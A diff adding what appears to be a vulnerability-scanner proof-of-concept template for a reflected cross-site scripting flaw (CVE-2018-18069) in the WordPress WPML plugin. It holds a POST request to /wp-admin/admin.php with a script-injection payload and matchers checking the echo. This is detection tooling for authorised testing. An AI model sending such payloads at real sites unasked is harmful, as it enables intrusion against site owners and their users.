@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "WPML 插件 3.6.3 及之前版本中，process_forms 功能对 theme-localization.php 页面的 locale_file_name_ 参数缺乏过滤，通过 POST 请求向 /wp-admin/admin.php 提交恶意 payload，可触发反射型 XSS。检测方式：发送含 XSS payload 的 POST 请求，检查响应头中是否包含 _icl_current_admin_language cookie 且响应体回显 payload。"
+id = "POC-AVE-2018-0130"
+name = "WordPress WPML sitepress-multilingual-cms 3.6.3 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2018-0130"]
+vuln_id = [
+    "CVE-2018-18069",
+    "AVE-2018-0130",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin.php"
+protocol = "http"
+
+[poc.requests.body]
+content = 'icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"><script>alert(0);</script>']
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["_icl_current_admin_language"]
